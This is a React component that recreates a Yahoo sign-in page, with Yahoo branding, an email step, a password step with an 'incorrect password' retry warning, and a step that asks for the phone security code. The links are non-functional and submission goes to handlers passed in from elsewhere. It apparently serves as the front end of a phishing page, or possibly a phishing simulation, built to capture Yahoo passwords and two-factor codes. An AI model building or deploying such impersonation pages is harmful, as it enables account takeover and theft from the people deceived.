import React from 'react';
import { ShieldCheck, ArrowLeft, X } from 'lucide-react';

const YahooWordmark = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 60" height="32" fill="white">
    <path d="M0 14.5h16.8l9.6 20.7 9.7-20.7h16.4L29.6 50.6v14.9H14.4V50.5L0 14.5zm51.3 0h15.2v51H51.3V14.5zm19.5 0h16.5l10.3 28.7 10.3-28.7h16.2l-18.6 51H87L70.8 14.5zm56.5 0H143V65h-15.7V14.5zm0-14.5H143v12h-15.7V0z" />
  </svg>
);

const Spinner = () => (
  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

export default function YahooLoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  const inputCls = (hasError) => [
    'w-full border rounded-lg px-4 py-3 text-sm outline-none transition',
    hasError
      ? 'border-red-500 focus:ring-2 focus:ring-red-200'
      : 'border-gray-300 focus:border-[#6001d2] focus:ring-2 focus:ring-purple-100',
  ].join(' ');

  return (
    <div className="min-h-screen w-screen flex flex-col bg-[#f0e6ff]">
      {/* Purple top bar */}
      <div className="bg-[#6001d2] flex items-center justify-between px-6 py-4 shadow">
        <div className="flex items-center gap-2">
          {/* Y! logo dot */}
          <div className="w-8 h-8 bg-white rounded-full flex items-center justify-center">
            <span className="text-[#6001d2] font-black text-lg leading-none">Y!</span>
          </div>
          <span className="text-white font-bold text-xl tracking-tight">Yahoo</span>
        </div>
        <button onClick={onClose} className="text-white/70 hover:text-white p-1 transition">
          <X size={20} />
        </button>
      </div>

      {/* Card */}
      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="bg-white rounded-2xl shadow-xl w-full max-w-[400px] overflow-hidden">

          {/* Card header */}
          <div className="bg-[#6001d2] px-8 pt-8 pb-6 text-center">
            <div className="w-14 h-14 bg-white rounded-full flex items-center justify-center mx-auto mb-3">
              <span className="text-[#6001d2] font-black text-2xl leading-none">Y!</span>
            </div>
            <h2 className="text-white text-lg font-bold">
              {formStep === 1 ? 'Sign in to Yahoo' : formStep === 2 ? 'Enter your password' : 'Verify your account'}
            </h2>
          </div>

          {/* Card form area */}
          <div className="px-8 py-7">

            {/* Step 1 — Email */}
            {formStep === 1 && (
              <form onSubmit={onContinue}>
                <div className="mb-5">
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                    Email address or username
                  </label>
                  <input
                    type="text"
                    name="email"
                    id="yahoo-email"
                    value={email}
                    onChange={onInputChange}
                    placeholder="Enter your Yahoo email"
                    autoFocus
                    required
                    className={inputCls(!!emailError)}
                  />
                  {emailError && <p className="text-xs text-red-600 mt-1">⚠ {emailError}</p>}
                  {!emailError && <p className="text-xs text-gray-400 mt-1">{hint}</p>}
                </div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-[#6001d2] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition inline-flex items-center justify-center gap-2"
                >
                  {isSubmitting ? <><Spinner />Checking…</> : 'Next'}
                </button>
                <p className="text-center text-xs text-gray-400 mt-5">
                  Don&apos;t have an account?{' '}
                  <span className="text-[#6001d2] cursor-pointer hover:underline font-medium">Create one</span>
                </p>
              </form>
            )}

            {/* Step 2 — Password */}
            {formStep === 2 && (
              <form onSubmit={onPasswordSubmit}>
                <div className="inline-flex items-center gap-2 bg-purple-50 border border-purple-200 rounded-full px-3 py-1.5 text-xs text-purple-700 mb-5">
                  <span className="w-5 h-5 rounded-full bg-[#6001d2] text-white flex items-center justify-center font-bold text-[10px]">
                    {email.charAt(0).toUpperCase()}
                  </span>
                  {email}
                </div>

                <div className="mb-5">
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Password</label>
                  <input
                    type="password"
                    name="password"
                    id="yahoo-password"
                    value={password}
                    onChange={onInputChange}
                    placeholder="Enter your password"
                    autoFocus
                    required
                    className={inputCls(pwWarning)}
                  />
                  {pwWarning && <p className="text-xs text-red-600 mt-1">⚠ Incorrect password, try again.</p>}
                </div>

                <p className="text-xs text-[#6001d2] mb-5 cursor-pointer hover:underline font-medium">Forgot password?</p>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-[#6001d2] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition inline-flex items-center justify-center gap-2"
                >
                  {isSubmitting ? <><Spinner />Signing in…</> : 'Sign in'}
                </button>

                <button type="button" onClick={onBack} className="w-full mt-3 text-sm text-[#6001d2] hover:underline flex items-center justify-center gap-1">
                  <ArrowLeft size={14} /> Back
                </button>
              </form>
            )}

            {/* Step 3 — OTP */}
            {formStep === 3 && (
              <form onSubmit={onOtpSubmit}>
                <div className="flex justify-center mb-4">
                  <div className="w-14 h-14 rounded-full bg-purple-50 border-2 border-purple-200 flex items-center justify-center">
                    <ShieldCheck size={26} className="text-[#6001d2]" />
                  </div>
                </div>
                <p className="text-sm text-center text-gray-600 mb-5">
                  We sent a security code to your phone. Enter it here to verify it&apos;s really you.
                </p>
                <div className="mb-5">
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Security code</label>
                  <input
                    type="text"
                    id="yahoo-otp"
                    value={otp}
                    onChange={onOtpChange}
                    placeholder="Enter code"
                    inputMode="numeric"
                    autoFocus
                    required
                    className={inputCls(!!otpError)}
                  />
                  {otpError && <p className="text-xs text-red-600 mt-1">⚠ {otpError}</p>}
                </div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-[#6001d2] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition inline-flex items-center justify-center gap-2"
                >
                  {isSubmitting ? <><Spinner />Verifying…</> : 'Verify'}
                </button>
                <button type="button" onClick={onClose} className="w-full mt-3 text-sm text-gray-400 hover:text-gray-600 transition">
                  Cancel
                </button>
              </form>
            )}

          </div>
        </div>
      </div>

      <p className="text-center text-[11px] text-gray-400 pb-6">
        © {new Date().getFullYear()} Yahoo · <span className="hover:underline cursor-pointer">Privacy Policy</span>
      </p>
    </div>
  );
}
